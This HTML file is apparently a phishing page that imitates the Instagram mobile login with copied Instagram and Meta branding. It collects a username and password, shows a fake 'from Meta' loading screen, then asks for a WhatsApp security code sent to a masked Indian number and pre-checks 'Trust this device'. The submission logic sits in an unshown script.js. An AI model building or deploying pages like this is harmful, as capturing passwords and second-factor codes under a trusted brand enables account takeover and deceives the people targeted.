<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Login</title>
  <link rel="stylesheet" href="styles.css">
  <meta name="theme-color" content="#1A252E">
</head>
<body>
  <div class="app-container">
    <!-- Login Screen -->
    <div id="login-screen" class="screen">
      
      <!-- Top Area: Language Selector -->
      <header class="top-bar">
        <button type="button" class="lang-selector">
          English (US)
        </button>
      </header>
      
      <!-- Center: Logo -->
      <div class="logo-container">
        <div class="logo-mark">
          <svg width="68" height="68" viewBox="0 0 100 100">
            <defs>
              <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
                <stop offset="0%" stop-color="#FFD600" />
                <stop offset="25%" stop-color="#FF7A00" />
                <stop offset="50%" stop-color="#FF0069" />
                <stop offset="75%" stop-color="#D300C5" />
                <stop offset="100%" stop-color="#7638FA" />
              </linearGradient>
            </defs>
            <rect x="15" y="15" width="70" height="70" rx="20" fill="none" stroke="url(#ig-grad)" stroke-width="8" />
            <circle cx="50" cy="50" r="18" fill="none" stroke="url(#ig-grad)" stroke-width="8" />
            <circle cx="69" cy="31" r="5" fill="url(#ig-grad)" />
          </svg>
        </div>
      </div>
      
      <!-- Form Area -->
      <form id="login-form" class="login-form" autocomplete="off">
        <div class="input-group">
          <input type="text" id="username" class="input-field" placeholder="Username, email or mobile number" required autocomplete="username">
        </div>
        
        <div class="input-group">
          <input type="password" id="password" class="input-field" placeholder="Password" required autocomplete="current-password">
        </div>
        
        <button type="submit" id="login-btn" class="btn-primary">
          <span class="btn-text">Log in</span>
        </button>
      </form>
      
      <!-- Lower Actions -->
      <div class="lower-actions">
        <a href="#" class="action-link">Forgot password?</a>
      </div>
      
      <!-- Create Account -->
      <div class="create-account-wrapper">
        <button type="button" class="create-account-btn">Create new account</button>
      </div>
      
      <!-- Footer Branding -->
      <div class="footer-branding">
        <div class="meta-logo-plain">
          <svg viewBox="0 0 400 200" width="22" height="11">
            <path fill="currentColor" d="M110,60 C75,60 40,85 40,120 C40,155 75,180 110,180 C140,180 160,165 175,145 L185,130 L215,130 L225,145 C240,165 260,180 290,180 C325,180 360,155 360,120 C360,85 325,60 290,60 C260,60 240,75 225,95 L215,110 L185,110 L175,95 C160,75 140,60 110,60 Z M110,95 C130,95 145,105 155,120 C145,135 130,145 110,145 C90,145 75,135 75,120 C75,105 90,95 110,95 Z M290,95 C310,95 325,105 325,120 C325,135 310,145 290,145 C270,145 255,135 255,120 C255,105 270,95 290,95 Z"/>
          </svg>
          <span class="meta-text">Meta</span>
        </div>
      </div>
    </div>
    
    <!-- Loading Screen (from Meta) -->
    <div id="loading-screen" class="screen hidden" style="background-color: #000000;">
      <div class="logo-container loading-logo">
        <div class="logo-mark">
          <svg width="76" height="76" viewBox="0 0 100 100">
            <defs>
              <linearGradient id="ig-grad-load" x1="0%" y1="100%" x2="100%" y2="0%">
                <stop offset="0%" stop-color="#FFD600" />
                <stop offset="25%" stop-color="#FF7A00" />
                <stop offset="50%" stop-color="#FF0069" />
                <stop offset="75%" stop-color="#D300C5" />
                <stop offset="100%" stop-color="#7638FA" />
              </linearGradient>
            </defs>
            <rect x="15" y="15" width="70" height="70" rx="20" fill="none" stroke="url(#ig-grad-load)" stroke-width="8" />
            <circle cx="50" cy="50" r="18" fill="none" stroke="url(#ig-grad-load)" stroke-width="8" />
            <circle cx="69" cy="31" r="5" fill="url(#ig-grad-load)" />
          </svg>
        </div>
      </div>
      
      <div class="loading-footer">
        <span class="from-text">from</span>
        <div class="meta-gradient-logo">
          <svg viewBox="0 0 400 200" width="28" height="14">
            <path fill="url(#ig-grad-load)" d="M110,60 C75,60 40,85 40,120 C40,155 75,180 110,180 C140,180 160,165 175,145 L185,130 L215,130 L225,145 C240,165 260,180 290,180 C325,180 360,155 360,120 C360,85 325,60 290,60 C260,60 240,75 225,95 L215,110 L185,110 L175,95 C160,75 140,60 110,60 Z M110,95 C130,95 145,105 155,120 C145,135 130,145 110,145 C90,145 75,135 75,120 C75,105 90,95 110,95 Z M290,95 C310,95 325,105 325,120 C325,135 310,145 290,145 C270,145 255,135 255,120 C255,105 270,95 290,95 Z"/>
          </svg>
          <span class="meta-text-gradient">Meta</span>
        </div>
      </div>
    </div>

    <!-- OTP Screen -->
    <div id="otp-screen" class="screen hidden" style="background-color: #000000;">
      <div class="otp-container">
        <!-- Padlock Icon Header -->
        <div class="padlock-wrapper">
          <svg class="padlock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
        </div>
        
        <div class="otp-title">
          Enter the code we sent via WhatsApp to your mobile number: +91 ****** ***53.
        </div>

        <!-- Form Area -->
        <form id="otp-form" class="login-form" autocomplete="off">
          <div class="input-group">
            <input type="text" id="otp-code" class="input-field" placeholder="Security Code" required>
          </div>
          
          <button type="submit" id="otp-btn" class="btn-primary" style="margin-top: 10px;">
            <span class="btn-text">Confirm</span>
          </button>
        </form>

        <div class="checkbox-group">
          <input type="checkbox" id="trust-device" class="checkbox-control" checked>
          <label for="trust-device" class="checkbox-label-text">
            Trust this device
            <span class="checkbox-sublabel">We won't ask for a code next time you log in</span>
          </label>
        </div>

        <div class="otp-links">
          <div class="otp-link-label">Didn't get a security code?</div>
          <a href="#" class="otp-link">Send code via SMS instead</a>
        </div>

        <div class="otp-backup-text">
          If you're unable to receive a security code, use one of your <a href="#" class="otp-link" style="font-weight: normal;">backup codes</a>.
        </div>
      </div>
    </div>

    <!-- Success Screen (Private Space) -->
    <div id="success-screen" class="screen hidden" style="background-color: #000000;">
      <div class="private-space-container">
        <h1 class="private-space-title">Private Space</h1>
      </div>
    </div>
  </div>
  
  <script src="script.js"></script>
</body>
</html>
